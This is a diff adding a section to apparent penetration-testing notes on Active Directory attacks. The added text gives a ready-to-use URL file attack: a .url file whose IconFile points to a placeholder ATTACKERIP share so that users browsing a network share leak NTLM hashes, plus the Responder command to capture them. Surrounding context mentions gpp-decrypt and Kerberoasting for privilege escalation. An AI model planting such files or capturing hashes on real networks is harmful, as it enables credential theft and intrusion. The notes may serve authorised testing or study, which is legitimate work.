@@ -280,5 +280,22 @@ syntax: gpp-decrypt cPassword
 
 With this, one can try to escalate privileges or even, if it is a service user, use Kerberoasting to get another hash and see if you can get Admin access on the DC. 
 
+URL File Attacks
+
+These are not so common anymore, but they can work. You need to place a file with the following into a Share folder:
+
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\ATTACKERIP\%USERNAME%.icon
+IconIndex=1
+
+save the file as "@whatever.url" - this will ensure that the file is at the top of the list on the Share and will be run. If a user clicks on it, it doesnt actually take the user anywhere. 
+
+Now, run responder on the attack machine and wait for the hashes to be dumped to responder.
+
+syntax: responder -I eth0 -v
+
+
 
 
